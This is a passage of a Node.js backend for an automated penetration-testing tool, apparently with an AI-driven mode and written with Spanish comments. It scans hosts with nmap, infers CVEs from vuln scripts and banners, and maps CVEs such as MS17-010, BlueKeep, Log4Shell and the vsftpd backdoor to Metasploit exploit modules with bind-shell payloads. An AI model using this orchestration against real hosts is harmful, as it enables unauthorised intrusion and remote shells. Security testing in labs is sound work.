const express = require("express");
const cors = require("cors");
const { execFile, spawn } = require("child_process");
const net  = require("net");
const path = require("path");
const os   = require("os");
const fs   = require("fs");
const db   = require("./db");

// Raw TCP banner grab — nmap's -sV occasionally fails to fingerprint a service
// (shows "ftp?" with no version) even though the banner is plaintext and instant,
// e.g. vsftpd sends "220 (vsFTPd 2.3.4)" the moment the socket connects.
// Used as a fallback when nmap's own version detection comes up empty.
function grabBanner(host, port, timeoutMs = 3000) {
  return new Promise((resolve) => {
    const socket = net.createConnection({ host, port });
    let data = "";
    let done = false;
    const finish = (result) => {
      if (done) return;
      done = true;
      socket.destroy();
      resolve(result);
    };
    socket.setTimeout(timeoutMs, () => finish(data || null));
    socket.on("data", (chunk) => {
      data += chunk.toString("utf8");
      if (data.includes("\n")) finish(data);
    });
    socket.on("error", () => finish(null));
    socket.on("close", () => finish(data || null));
  });
}

const app = express();
app.use(cors());
app.use(express.json({ limit: "20mb" }));

const port = 3000;
const SERVER_STARTED_AT = new Date().toISOString();

// ══════════════════════════════════════════════════════════════════════════════
// POST /reset — limpia el estado en memoria del backend (llamado al recargar UI)
// ══════════════════════════════════════════════════════════════════════════════
app.post("/reset", (_req, res) => {
  // Limpiar sesiones en memoria
  for (const key of Object.keys(activeSessions)) delete activeSessions[key];
  sessionCounter = 0;

  // Matar y limpiar raw shells (wu-ftpd / 7350wurm) para evitar conflictos de sessionId
  for (const [sid, rs] of Object.entries(rawShells)) {
    try { if (rs?.process && !rs.process.killed) rs.process.kill(); } catch (_) {}
    delete rawShells[sid];
  }

  // Limpiar buffer de msfconsole para evitar contaminación entre sesiones
  msfBuf = "";

  console.log("[reset] Estado del backend reiniciado desde el frontend");
  res.json({ ok: true });
});

//Connect-Network
app.post("/connect", (req, res) => {
  const { type, ip, port: targetPort, user, password } = req.body;

  // Validar campos requeridos
  if (!type || !ip || !targetPort || !user || !password) {
    return res
      .status(400)
      .json({ error: "Faltan parámetros: type, ip, port, user o password" });
  }

  // Validar tipo de conexión soportado
  if (type !== "vpn" && type !== "ncat") {
    return res
      .status(400)
      .json({ error: "Tipo de conexión no soportado. Use 'vpn' o 'ncat'." });
  }

  // Selección de ejecutable según tipo
  let executable;
  if (type === "vpn") {
    executable = path.resolve(__dirname, "../core/vpn_connect");
  } else if (type === "ncat") {
    executable = path.resolve(__dirname, "../core/ncat_connect");
  }

  // Ejecutar binario C con argumentos
  execFile(
    executable,
    [type, ip, targetPort.toString(), user, password], // ahora pasa password también
    (error, stdout, stderr) => {
      if (error) {
        console.error(`Error al ejecutar ${type}:`, error);
        return res.status(500).json({
          error: `Error al ejecutar la conexión ${type}`,
          details: stderr || error.message,
        });
      }

      // Respuesta al frontend
      res.json({
        message: stdout.trim() || `${type} connection established successfully`,
      });
    }
  );
});

// Scan-Network
app.post("/scan-network", async (req, res) => {
  const { network, jobType = "Normal", model = null } = req.body;

  if (!network) {
    return res.status(400).json({ error: "Falta el parámetro 'network' en el body" });
  }

  const executable = path.resolve(__dirname, "../core/network_scan");
  const t0Scan = Date.now();

  execFile(executable, [network], { timeout: 60000 }, async (error, stdout, stderr) => {
    const scanDurationMs = Date.now() - t0Scan;
    if (error && error.killed) {
      return res.status(504).json({ error: "Scan timeout — reinicia el backend y ejecuta: pkill nmap" });
    }
    if (error) {
      console.error("Error ejecutando network_scan:", error);
      return res.status(500).json({
        error: "Error ejecutando el escaneo de red",
        details: stderr || error.message,
      });
    }

    const raw = stdout.trim();
    console.log("[scan-network] stdout repr:", JSON.stringify(raw.slice(0, 120)));

    let parsed = null;
    try {
      parsed = JSON.parse(raw);
    } catch {
      const start = raw.indexOf("{");
      const end   = raw.lastIndexOf("}");
      if (start !== -1 && end > start) {
        try {
          parsed = JSON.parse(raw.slice(start, end + 1));
        } catch (innerErr) {
          console.warn("[scan-network] Could not parse extracted JSON:", innerErr.message);
        }
      }
    }

    if (!parsed) {
      console.warn("[scan-network] Returning raw output as fallback");
      return res.json({ hosts: [], result: raw });
    }

    // Guardar en BD: crear job + insertar hosts
    try {
      let resolvedModel = model;
      if (jobType === "IA" && !resolvedModel) {
        try { resolvedModel = require("./ia_config").ia_modelo ?? null; } catch { /* ignore */ }
      }
      const [jobResult] = await db.execute(
        "INSERT INTO jobs (type, model) VALUES (?, ?)",
        [jobType, resolvedModel]
      );
      const jobId = jobResult.insertId;

      const HOSTS_EXCLUIDOS = ["10.0.0.2", "10.0.0.12"];
      const hosts = (parsed.hosts || []).filter(h => !HOSTS_EXCLUIDOS.includes(h.ip));
      parsed.hosts = hosts;
      for (const host of hosts) {
        const [hostResult] = await db.execute(
          "INSERT INTO hosts (jobs_id, target_host, state) VALUES (?, ?, 'done')",
          [jobId, host.ip]
        );
        await logActivity(jobId, "host_identified", hostResult.insertId, "hosts",
          { ip: host.ip, ports: host.ports },
          { observaciones: `Host ${host.ip} descubierto con ${host.ports?.length ?? 0} puertos abiertos` }
        );
      }

      await logActivity(jobId, "scan_complete", jobId, "jobs",
        { network, hosts: hosts.length },
        { duration_ms: scanDurationMs, observaciones: `Escaneo de red completado: ${hosts.length} hosts en ${scanDurationMs}ms` }
      );
      console.log(`[scan-network] Job ${jobId} creado con ${hosts.length} hosts en ${scanDurationMs}ms`);
      return res.json({ ...parsed, jobId });
    } catch (dbErr) {
      console.error("[scan-network] Error BD:", dbErr.message);
      return res.json(parsed); // devuelve resultado aunque falle la BD
    }
  });
});

// Scan-Host (deep nmap -sV against a single IP)
app.post("/scan-host", async (req, res) => {
  const { target, jobId } = req.body;
  if (!target) return res.status(400).json({ error: "Falta el parámetro 'target'" });

  if (!/^[\d.]+$/.test(target)) {
    return res.status(400).json({ error: "target debe ser una dirección IP válida" });
  }

  const t0DeepScan = Date.now();
  execFile(
    "nmap",
    ["-sV", "-p-", "--open", "-T4", target],
    { timeout: 600000 },
    async (error, stdout, stderr) => {
      const deepScanDurationMs = Date.now() - t0DeepScan;
      if (error && error.killed) {
        return res.status(504).json({ error: "nmap timeout after 5 minutes" });
      }
      if (error) {
        console.error("[scan-host] nmap error:", error.message);
        if (error.code === "ENOENT") return res.status(500).json({ error: "nmap no está instalado. Instálalo con: sudo apt install nmap" });
        return res.status(500).json({ error: "Error ejecutando nmap", details: stderr || error.message });
      }

      const services = [];
      const lineRe = /^(\d+)\/(tcp|udp)\s+open\s+(\S+)\s*(.*)/;
      for (const line of stdout.split("\n")) {
        const m = line.trim().match(lineRe);
        if (m) {
          services.push({
            port:    parseInt(m[1], 10),
            proto:   m[2],
            service: m[3],
            version: m[4].trim(),
          });
        }
      }

      console.log(`[scan-host] ${target} → ${services.length} services`);

      // Guardar en BD si tenemos jobId
      // Detectar OS desde el output del deep scan
      const openPortVersions = {};
      for (const svc of services) openPortVersions[svc.port] = svc.version;
      const detectedOsDeep = parseOsFromNmap(stdout, openPortVersions);
      if (detectedOsDeep) console.log(`[scan-host] ${target} OS detectado: ${detectedOsDeep}`);

      if (jobId) {
        try {
          const [[hostRow]] = await db.execute(
            "SELECT id FROM hosts WHERE jobs_id = ? AND target_host = ?",
            [jobId, target]
          );
          if (hostRow) {
            for (const svc of services) {
              await db.execute(
                "INSERT INTO host_nmap (host_id, port, nmap_state, nmap_service, nmap_version, state) VALUES (?, ?, 'open', ?, ?, 'done')",
                [hostRow.id, svc.port, svc.service, svc.version]
              );
            }
            if (detectedOsDeep) {
              await db.execute("UPDATE hosts SET os_info = ? WHERE id = ?", [detectedOsDeep, hostRow.id]);
            }
            await logActivity(jobId, "deep_scan_complete", hostRow.id, "hosts",
              { ip: target, services: services.length },
              { duration_ms: deepScanDurationMs, observaciones: `Deep scan completado en ${target}: ${services.length} servicios en ${deepScanDurationMs}ms` }
            );
            console.log(`[scan-host] ${services.length} servicios guardados para host ${hostRow.id} en ${deepScanDurationMs}ms`);
          }
        } catch (dbErr) {
          console.error("[scan-host] Error BD:", dbErr.message);
        }
      }

      res.json({ target, services, osInfo: detectedOsDeep ?? null, duration_ms: deepScanDurationMs });
    }
  );
});

// ── Vuln parser helper ─────────────────────────────────────────────────────
function parseVulnOutput(raw) {
  // Normalize Windows line endings
  const lines  = raw.replace(/\r/g, "").split("\n");
  const vulns  = [];
  const portRe = /^(\d+)\/(tcp|udp)\s+open/;
  const cveRe  = /CVE-\d{4}-\d{4,7}/g;

  // IMPORTANT: use exactly ONE space after | so internal content lines like
  // "|   VULNERABLE:" (3 spaces) are NOT mistaken for new script headers.
  // Real nmap script headers look like "| scriptname:" (one space).
  const scriptRe = /^\| ([\w][\w.-]*):\s*$/;

  let currentPort = null;
  let scriptName  = null;
  let blockLines  = [];

  const flushBlock = () => {
    if (!scriptName) { blockLines = []; return; }

    const text   = blockLines.join("\n");
    const isVuln = /VULNERABLE/i.test(text);
    const cves   = [...new Set((text.match(cveRe) || []))];

    if (!isVuln && cves.length === 0) { blockLines = []; scriptName = null; return; }

    const stateM = text.match(/State:\s*(VULNERABLE[^\n]*|LIKELY VULNERABLE[^\n]*)/i);
    const riskM  = text.match(/Risk factor:\s*([^\n]+)/i);
    const cvssM  = text.match(/CVSS:\s*([\d.]+)/i);

    const desc = blockLines
      .map(l => l.replace(/^\|[-_ ]?\s*/, "").trim())
      .filter(l =>
        l &&
        !/^(State|IDs|CVE|Risk factor|Disclosure date|References|https?:|CVSS)/.test(l) &&
        !/^(VULNERABLE|LIKELY|_)/.test(l)
      )
      .slice(0, 4)
      .join(" ")
      .replace(/\s+/g, " ")
      .trim()
      .slice(0, 280);

    vulns.push({
      port:        currentPort,
      script:      scriptName,
      state:       stateM ? stateM[1].trim() : "VULNERABLE",
      cves,
      risk:        riskM ? riskM[1].trim() : null,
      cvss:        cvssM ? cvssM[1].trim() : null,
      description: desc,
    });

    blockLines = [];
    scriptName = null;
  };

  for (const line of lines) {
    const pm = line.match(portRe);
    if (pm) { currentPort = parseInt(pm[1], 10); continue; }

    // New script block header (exactly one space after pipe)
    const sm = line.match(scriptRe);
    if (sm) { flushBlock(); scriptName = sm[1]; continue; }

    if (scriptName) {
      if (line.match(/^\|_/))        { blockLines.push(line); flushBlock(); }
      else if (line.startsWith("|")) { blockLines.push(line); }
      else if (line.trim() === "")   { flushBlock(); }
      else                           { flushBlock(); } // non-pipe line ends block
    }
  }
  flushBlock();
  return vulns;
}

// Inserta un registro en activity_logs
async function logActivity(jobId, eventType, refId, refTable, details, opts = {}) {
  try {
    await db.execute(
      `INSERT INTO activity_logs
        (jobs_id, event_type, reference_id, reference_table, details_json, intentos, duration_ms, observaciones, comentarios)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        jobId,
        eventType,
        refId,
        refTable,
        JSON.stringify(details),
        opts.intentos    ?? null,
        opts.duration_ms ?? null,
        opts.observaciones ?? null,
        opts.comentarios   ?? null,
      ]
    );
  } catch (e) {
    console.error(`[activity_logs] Error insertando ${eventType}:`, e.message);
  }
}

// Extrae un resumen limpio del output de msfconsole para guardar en BD
function msfSummary(raw, module, payload) {
  const clean = stripAnsi(raw);
  let reason = "Unknown";
  if (/connection.*refused/i.test(clean))          reason = "Connection refused";
  else if (/login failed|no-access/i.test(clean))  reason = "Access denied";
  else if (/bad-config/i.test(clean))              reason = "Bad config";
  else if (/not.*compatible.*payload|value.*PAYLOAD.*not valid/i.test(clean)) reason = "Incompatible payload";
  else if (/no-target|no compatible target/i.test(clean)) reason = "No compatible target";
  else if (/unreachable/i.test(clean))             reason = "Host unreachable";
  else if (/no session was created/i.test(clean))  reason = "No session created";
  else if (/session.*opened/i.test(clean))         reason = "Session opened";
  return `module: ${module ?? "unknown"} | payload: ${payload ?? "self-contained"} | result: ${reason}`;
}

// Scan-Vulns (nmap --script vuln against a single IP)
app.post("/scan-vulns", async (req, res) => {
  const { target, jobId } = req.body;
  if (!target) return res.status(400).json({ error: "Falta el parámetro 'target'" });
  if (!/^[\d.]+$/.test(target)) return res.status(400).json({ error: "target debe ser una dirección IP válida" });

  execFile(
    "nmap",
    ["--script", "vuln", "-T4", target],
    { timeout: 600000 },
    async (error, stdout, stderr) => {
      if (error && error.killed) return res.status(504).json({ error: "nmap timeout after 10 minutes" });
      if (error) {
        console.error("[scan-vulns] nmap error:", error.message);
        if (error.code === "ENOENT") return res.status(500).json({ error: "nmap no está instalado. Instálalo con: sudo apt install nmap" });
        return res.status(500).json({ error: "Error ejecutando nmap", details: stderr || error.message });
      }

      console.log(`[scan-vulns] ${target} raw output (first 800 chars):\n${stdout.slice(0, 800)}`);

      const vulns = parseVulnOutput(stdout);
      console.log(`[scan-vulns] ${target} → ${vulns.length} vuln(s) parsed`);

      // Guardar en BD si tenemos jobId
      if (jobId && vulns.length > 0) {
        try {
          const [[hostRow]] = await db.execute(
            "SELECT id FROM hosts WHERE jobs_id = ? AND target_host = ?",
            [jobId, target]
          );
          if (hostRow) {
            for (const vuln of vulns) {
              const [[nmapRow]] = await db.execute(
                "SELECT id FROM host_nmap WHERE host_id = ? AND port = ?",
                [hostRow.id, vuln.port ?? 0]
              );
              const severity = vuln.cvss >= 9 ? "critical" : vuln.cvss >= 7 ? "high" : vuln.cvss >= 4 ? "medium" : "low";
              for (const cve of (vuln.cves.length > 0 ? vuln.cves : ["UNKNOWN"])) {
                await db.execute(
                  "INSERT INTO host_vuln (host_id, host_nmap_id, cve, severity, service, state) VALUES (?, ?, ?, ?, ?, 'done')",
                  [hostRow.id, nmapRow?.id ?? null, cve, severity, vuln.script ?? null]
                );
              }
            }
            console.log(`[scan-vulns] ${vulns.length} vuln(s) guardadas para host ${hostRow.id}`);
          }
        } catch (dbErr) {
          console.error("[scan-vulns] Error BD:", dbErr.message);
        }
      }

      res.json({ target, vulns, _rawSnippet: stdout.slice(0, 600) });
    }
  );
});

// Deep Scan
app.post("/deep-scan", (req, res) => {
  const { target, ports = [] } = req.body;
  if (!target) return res.status(400).json({ error: "Falta el parámetro 'target'" });

  const timestamp = new Date().toISOString();
  const result = [
    `[+] Deep scan completed on ${target} at ${timestamp}`,
    `[+] Services detected: ${ports.length} open ports`,
    ports.length > 0
      ? `[+] Ports: ${ports.join(", ")}`
      : `[!] No open ports found`,
    `[+] OS fingerprint: Linux 5.x / Windows 10 (estimated)`,
    `[*] Full report ready — replace with real nmap -sV output.`,
  ].join("\n");

  res.json({ result });
});

// Extracts OS string from nmap output using multiple detection methods
function parseOsFromNmap(stdout, openPortVersions = {}) {
  // 1. smb-os-discovery — most accurate for Windows
  const smbOsM = stdout.match(/\|\s+OS:\s+(.+)/);
  if (smbOsM) return smbOsM[1].trim();

  // 2. nmap OS detection lines (requires -O, may not be present)
  const osDetails = stdout.match(/OS details:\s+(.+)/);
  if (osDetails) return osDetails[1].split(",")[0].trim();
  const osRunning = stdout.match(/Running(?:\s+\(JUST GUESSING\))?:\s+(.+)/);
  if (osRunning) return osRunning[1].split(",")[0].trim();

  // 3. CPE strings from -sV (cpe:/o:vendor:product:version)
  for (const m of stdout.matchAll(/cpe:\/o:([^:\s]+):([^:\s]+)(?::([^\s,|]+))?/g)) {
    const vendor = m[1].toLowerCase(), product = m[2].replace(/_/g, " ");
    const ver    = m[3] ? m[3].replace(/_/g, ".") : "";
    if (vendor.includes("microsoft"))             return `Windows ${product} ${ver}`.replace(/\s+/g," ").trim();
    if (vendor === "linux")                        return `Linux kernel ${ver}`.trim();
    if (vendor.includes("canonical"))             return `Ubuntu Linux ${ver}`.trim();
    if (vendor.includes("debian"))                return `Debian Linux ${ver}`.trim();
    if (vendor.includes("redhat") || vendor.includes("centos")) return `Red Hat / CentOS ${ver}`.trim();
    if (vendor.includes("apple"))                 return `macOS ${ver}`.trim();
    if (product || vendor)                         return `${vendor} ${product} ${ver}`.replace(/\s+/g," ").trim();
  }

  // 4. Infer from service version banners (-sV output)
  const allVersions = Object.values(openPortVersions).join(" ");
  if (/ubuntu/i.test(allVersions))               return "Linux (Ubuntu)";
  if (/debian/i.test(allVersions))               return "Linux (Debian)";
  if (/red\s*hat|rhel/i.test(allVersions))       return "Linux (Red Hat)";
  if (/centos/i.test(allVersions))               return "Linux (CentOS)";
  if (/fedora/i.test(allVersions))               return "Linux (Fedora)";
  if (/microsoft windows/i.test(allVersions)) {
    const wm = allVersions.match(/Microsoft Windows ([^\s,|]+(?:\s+\w+)?)/i);
    return wm ? `Windows ${wm[1].trim()}` : "Windows";
  }
  if (/windows/i.test(allVersions))              return "Windows";
  if (/freebsd/i.test(allVersions))              return "FreeBSD";
  if (/openbsd/i.test(allVersions))              return "OpenBSD";

  return null;
}

// Find Vulns — real nmap --script vuln scan, returns CVE list
app.post("/find-vulns", async (req, res) => {
  const { ip, jobId } = req.body;
  if (!ip) return res.status(400).json({ error: "Falta el parámetro 'ip'" });
  if (!/^[\d.]+$/.test(ip)) return res.status(400).json({ error: "ip debe ser una dirección IP válida" });

  const t0FindVulns = Date.now();
  execFile(
    "nmap",
    ["-sV", "--script", "vuln,ftp-vsftpd-backdoor,ftp-anon,smb-vuln-ms17-010,smb-vuln-ms08-067,http-shellshock,smb-os-discovery", "--script-args", "http-shellshock.uri=/cgi-bin/test-cgi", "-T4", "--script-timeout", "100s", ip],
    { timeout: 600000 },
    async (error, stdout, stderr) => {
      const findVulnsDurationMs = Date.now() - t0FindVulns;
      if (error && error.killed) return res.status(504).json({ error: "nmap timeout" });
      if (error) return res.status(500).json({ error: "Error ejecutando nmap", details: stderr || error.message });

      console.log(`[find-vulns] ${ip} raw (first 600):\n${stdout.slice(0, 600)}`);

      const lines = stdout.replace(/\r/g, "").split("\n");
      const vulns = [];
      const seen  = new Set();

      const portRe = /^(\d+)\/(tcp|udp)\s+open\s+(\S+)/;
      const cveRe  = /CVE-\d{4}-\d{4,7}/g;
      const riskRe = /Risk factor\s*:\s*(\w+)/i;
      const cvssRe = /CVSS\s*:\s*([\d.]+)/i;

      const severityFromCvss = (s) => {
        const n = parseFloat(s);
        if (n >= 9.0) return "critical";
        if (n >= 7.0) return "high";
        if (n >= 4.0) return "medium";
        return "low";
      };
      const severityFromRisk = (r) => {
        if (!r) return "medium";
        const l = r.toLowerCase();
        if (l === "critical") return "critical";
        if (l === "high")     return "high";
        if (l === "medium")   return "medium";
        return "low";
      };

      let currentPort    = null;
      let currentService = null;
      const win = [];

      for (const line of lines) {
        const pm = line.match(portRe);
        if (pm) {
          currentPort    = parseInt(pm[1], 10);
          currentService = pm[3];
          win.length     = 0;
          continue;
        }
        win.push(line);
        if (win.length > 15) win.shift();

        const cves = line.match(cveRe);
        if (!cves) continue;

        const ctx   = win.join("\n");
        const riskM = ctx.match(riskRe);
        const cvssM = ctx.match(cvssRe);
        const sev   = cvssM ? severityFromCvss(cvssM[1])
                    : riskM ? severityFromRisk(riskM[1])
                    : "medium";

        for (const cve of cves) {
          const key = `${cve}:${currentPort}`;
          if (seen.has(key)) continue;
          seen.add(key);
          vulns.push({ cve, port: currentPort, service: currentService, severity: sev });
        }
      }

      // Some nmap scripts report VULNERABLE but without an explicit CVE string in output.
      // Map known script names → CVE so they always get picked up.
      const SCRIPT_CVE_MAP = {
        "ftp-vsftpd-backdoor":    { cve: "CVE-2011-2523", port: 21,   service: "ftp",  severity: "critical" },
        "ftp-proftpd-backdoor":   { cve: "CVE-2010-4221", port: 21,   service: "ftp",  severity: "high"     },
        // ftp-anon: port resolved dynamically from curPort2 (line below uses resolvedPort)
        "ftp-anon":               { cve: "CVE-1999-0497", port: 21,    service: "ftp",  severity: "medium",  detectRe: /Anonymous FTP login allowed/i },
        "smb-vuln-ms17-010":      { cve: "CVE-2017-0144", port: 445,  service: "smb",  severity: "critical" },
        "smb-vuln-ms08-067":      { cve: "CVE-2008-4250", port: 445,  service: "smb",  severity: "critical" },
        "smb-vuln-cve-2017-7494": { cve: "CVE-2017-7494", port: 445,  service: "smb",  severity: "critical" },
        "http-shellshock":        { cve: "CVE-2014-6271", port: null,  service: "http", severity: "critical" },
        "ssl-heartbleed":         { cve: "CVE-2014-0160", port: null,  service: "ssl",  severity: "high"     },
        "ssl-poodle":             { cve: "CVE-2014-3566", port: null,  service: "ssl",  severity: "medium"   },
        "ssl-ccs-injection":      { cve: "CVE-2014-0224", port: null,  service: "ssl",  severity: "high"     },
        "http-vuln-cve2014-3704": { cve: "CVE-2014-3704", port: null,  service: "http", severity: "critical" },
        "rdp-vuln-ms12-020":      { cve: "CVE-2012-0002", port: 3389, service: "rdp",  severity: "high"     },
      };

      const vulnBlockRe = /VULNERABLE/i;

      // Scan raw output for script blocks that say VULNERABLE but produced no CVE
      const rawLines = stdout.replace(/\r/g, "").split("\n");
      let curPort2 = null;
      const openPorts = {};        // port → service name (e.g. "ftp", "ftp?")
      const openPortVersions = {}; // port → version string (e.g. "vsftpd 2.3.4", "WU-FTPD wu-2.6.1-16")
      for (const line of rawLines) {
        const portM = line.match(/^(\d+)\/(tcp|udp)\s+open\s+(\S+)\s*(.*)/);
        if (portM) {
          curPort2 = parseInt(portM[1], 10);
          openPorts[curPort2] = portM[3];          // e.g. "ftp?", "ftp", "ssh"
          openPortVersions[curPort2] = portM[4].trim(); // e.g. "vsftpd 2.3.4"
          continue;
        }
        const sm = line.match(/^\|\s+([\w-]+):/);
        if (!sm) continue;
        const scriptName = sm[1];
        const mapping    = SCRIPT_CVE_MAP[scriptName];
        if (!mapping) continue;
        // Check block for VULNERABLE (default) or a script-specific pattern (e.g. ftp-anon)
        const idx     = rawLines.indexOf(line);
        const block   = rawLines.slice(idx, idx + 20).join("\n");
        const checkRe = mapping.detectRe ?? vulnBlockRe;
        if (!checkRe.test(block)) continue;
        const resolvedPort = mapping.port ?? curPort2;
        const key = `${mapping.cve}:${resolvedPort}`;
        if (!seen.has(key)) {
          seen.add(key);
          vulns.push({ cve: mapping.cve, port: resolvedPort, service: mapping.service, severity: mapping.severity });
        }
      }

      // Port-based fallback: inject known CVEs for services that nmap couldn't fingerprint
      // (e.g. vsftpd shows as "ftp?" when -sV can't get banner — script never produces output)
      const PORT_SERVICE_CVES = [
        // versionRe (optional): also match against the version string from nmap -sV
        // Only injected when the port is open in nmap output (openPorts[port] must exist)
        { port: 21,  serviceRe: /^ftp/i, versionRe: /vsftpd/i, cve: "CVE-2011-2523", service: "ftp", severity: "critical" },
        { port: 21,  serviceRe: /^ftp/i, versionRe: /wu-ftp/i,  cve: "CVE-2000-0573", service: "ftp", severity: "critical" },
        { port: 512, serviceRe: /^exec/i,                        cve: "CVE-1999-0651", service: "rexec",  severity: "high"  },
        { port: 513, serviceRe: /^login/i,                       cve: "CVE-1999-0651", service: "rlogin", severity: "high"  },
      ];
      for (const { port, serviceRe, versionRe, cve, service, severity } of PORT_SERVICE_CVES) {
        const svc = openPorts[port];
        if (!svc || !serviceRe.test(svc)) continue;
        if (versionRe && !versionRe.test(openPortVersions[port] ?? "")) continue;
        const key = `${cve}:${port}`;
        if (!seen.has(key)) {
          seen.add(key);
          vulns.push({ cve, port, service, severity });
        }
      }

      // Raw banner grab fallback for FTP: nmap's -sV sometimes fails to fingerprint
      // vsftpd/wu-ftpd (port stays "ftp?" with no version string), even though the
      // banner is plaintext and instant. Only runs if the version-based rule above
      // didn't already catch it.
      if (openPorts[21] && /^ftp/i.test(openPorts[21]) &&
          !seen.has("CVE-2011-2523:21") && !seen.has("CVE-2000-0573:21")) {
        const banner = await grabBanner(ip, 21);
        if (banner) {
          console.log(`[find-vulns] ${ip}:21 raw banner: ${banner.trim()}`);
          if (/vsftpd\s*2\.3\.4/i.test(banner)) {
            seen.add("CVE-2011-2523:21");
            vulns.push({ cve: "CVE-2011-2523", port: 21, service: "ftp", severity: "critical" });
          } else if (/wu-2\.6\.1|wu-ftpd/i.test(banner)) {
            seen.add("CVE-2000-0573:21");
            vulns.push({ cve: "CVE-2000-0573", port: 21, service: "ftp", severity: "critical" });
          }
        }
      }

      // Detectar OS del output de nmap
      const detectedOs = parseOsFromNmap(stdout, openPortVersions);
      if (detectedOs) console.log(`[find-vulns] ${ip} OS detectado: ${detectedOs}`);

      // RPC/DCOM (MS03-026): no existe script NSE que lo detecte, se infiere por
      // puerto 135 abierto + SO antiguo (via smb-os-discovery, ya incluido en este scan).
      if (openPorts[135] && detectedOs && /windows\s*(nt|2000|xp|server\s*2003|\b2003\b)/i.test(detectedOs)) {
        const key = "CVE-2003-0352:135";
        if (!seen.has(key)) {
          seen.add(key);
          vulns.push({ cve: "CVE-2003-0352", port: 135, service: "msrpc", severity: "critical" });
        }
      }

      console.log(`[find-vulns] ${ip} → ${vulns.length} CVE(s) found`);

      // Guardar en BD si tenemos jobId
      if (jobId) {
        try {
          const [[hostRow]] = await db.execute(
            "SELECT id FROM hosts WHERE jobs_id = ? AND target_host = ?",
            [jobId, ip]
          );
          if (hostRow) {
            // Actualizar OS siempre que se detecte
            if (detectedOs) {
              await db.execute(
                "UPDATE hosts SET os_info = ? WHERE id = ?",
                [detectedOs, hostRow.id]
              );
            }
            if (vulns.length === 0) { /* skip vuln inserts */ } else
            for (const vuln of vulns) {
              const [[nmapRow]] = await db.execute(
                "SELECT id FROM host_nmap WHERE host_id = ? AND port = ?",
                [hostRow.id, vuln.port ?? 0]
              );
              const [vulnResult] = await db.execute(
                "INSERT INTO host_vuln (host_id, host_nmap_id, cve, severity, service, state) VALUES (?, ?, ?, ?, ?, 'done')",
                [hostRow.id, nmapRow?.id ?? null, vuln.cve, vuln.severity, vuln.service ?? null]
              );
              await logActivity(jobId, "vuln_identified", vulnResult.insertId, "host_vuln",
                { ip, cve: vuln.cve, severity: vuln.severity, service: vuln.service, port: vuln.port },
                { observaciones: `${vuln.cve} encontrado en puerto ${vuln.port ?? "?"} (${vuln.service ?? "?"}) — ${vuln.severity}` }
              );
            }
            await logActivity(jobId, "find_vulns_complete", hostRow.id, "hosts",
              { ip, vulns: vulns.length },
              { duration_ms: findVulnsDurationMs, observaciones: `Find vulns completado en ${ip}: ${vulns.length} CVE(s) en ${findVulnsDurationMs}ms` }
            );
            console.log(`[find-vulns] ${vulns.length} vuln(s) guardadas para host ${hostRow.id} en ${findVulnsDurationMs}ms`);
          }
        } catch (dbErr) {
          console.error("[find-vulns] Error BD:", dbErr.message);
        }
      }

      res.json({ vulns, osInfo: detectedOs ?? null, duration_ms: findVulnsDurationMs });
    }
  );
});

// ── Metasploit integration ────────────────────────────────────────────────

// CVE → Metasploit module map (fast path — no msfconsole search roundtrip needed)
// Bind payloads: target opens port → attacker connects TO target (works through NAT/VPN)
const CVE_MODULES = {
  // Windows — bind meterpreter
  // eternalblue = x64 only; psexec = x86 + x64 (preferred for old/mixed targets)
  "CVE-2017-0143": { module: "exploit/windows/smb/ms17_010_psexec",             payload: "windows/meterpreter/bind_tcp"     }, // x86-safe
  "CVE-2017-0144": { module: "exploit/windows/smb/ms17_010_eternalblue",        payload: "windows/x64/meterpreter/bind_tcp" },
  "CVE-2017-0145": { module: "exploit/windows/smb/ms17_010_psexec",             payload: "windows/meterpreter/bind_tcp"     }, // x86-safe
  "CVE-2019-0708": { module: "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",  payload: "windows/x64/meterpreter/bind_tcp" },
  "CVE-2020-0796": { module: "exploit/windows/smb/cve_2020_0796_smbghost",      payload: "windows/x64/meterpreter/bind_tcp" },
  "CVE-2015-1635": { module: "exploit/windows/http/ms15_034_ulonglongadd",      payload: null                               },
  // Linux / multi — bind meterpreter or cmd bind
  "CVE-2011-2523": { module: "exploit/unix/ftp/vsftpd_234_backdoor",            payload: null                               }, // only accepts cmd/unix/interact (default)
  "CVE-2007-2447": { module: "exploit/multi/samba/usermap_script",              payload: "cmd/unix/bind_perl"               },
  "CVE-2004-2687": { module: "exploit/unix/misc/distcc_exec",                   payload: "cmd/unix/bind_perl"               },
  "CVE-2014-6271": { module: "exploit/multi/http/apache_mod_cgi_bash_env_exec", payload: "linux/x86/shell_bind_tcp",
                     uris: ["/cgi-bin/printenv", "/cgi-bin/test-cgi", "/cgi-bin/", "/cgi-bin/php", "/cgi-bin/bash"] },
  "CVE-2021-44228": { module: "exploit/multi/http/log4shell_header_injection",  payload: "linux/x64/meterpreter/bind_tcp"   },
  "CVE-2012-1823": { module: "exploit/multi/http/php_cgi_arg_injection",        payload: "linux/x86/meterpreter/bind_tcp"   },
  "CVE-2009-3843": { module: "exploit/multi/http/tomcat_mgr_upload",            payload: "linux/x64/meterpreter/bind_tcp"   },
  "CVE-2021-3156": { module: "exploit/linux/local/sudo_baron_samedit",          payload: "linux/x64/meterpreter/bind_tcp"   },
  // Windows 32-bit targets (IIS 6, Windows XP/2003) — x86 payload required
  "CVE-2017-7269": { module: "exploit/windows/iis/iis_webdav_scstoragepathfromurl", payload: "windows/meterpreter/bind_tcp" },
  "CVE-2008-4250": { module: "exploit/windows/smb/ms08_067_netapi",                 payload: "windows/meterpreter/bind_tcp" },
  "CVE-2003-0352": { module: "exploit/windows/dcerpc/ms03_026_dcom",               payload: "windows/shell/bind_tcp"       },
  // Scanners (informational only — skipped by canOpenSession)
  "CVE-2014-0160": { module: "auxiliary/scanner/ssl/openssl_heartbleed",             payload: null                          },
};

// Strip ANSI/VT100 escape sequences that msfconsole embeds in all output
function stripAnsi(s) {
  return s.replace(/\x1b\[[0-9;]*[A-Za-z]/g, "").replace(/\x1b[()][AB]/g, "");
}

// msfconsole wraps long session rows across multiple lines when the terminal width
// is narrow. Join continuation lines (≥10 leading spaces, no digit prefix) so that
// the session ID and the remote IP appear on the same logical line.
function joinSessionLines(text) {
  const out = [];
  for (const line of text.split("\n")) {
    if (/^\s*\d+\s/.test(line)) {
      out.push(line);
    } else if (out.length > 0 && /^\s{10,}\S/.test(line)) {
      out[out.length - 1] += " " + line.trim();
    }
  }
  return out.join("\n");
}

// Guess a bind payload from the module path (bind = target listens, we connect to it)
function guessPayload(modulePath) {
  if (!modulePath.startsWith("exploit/")) return null;
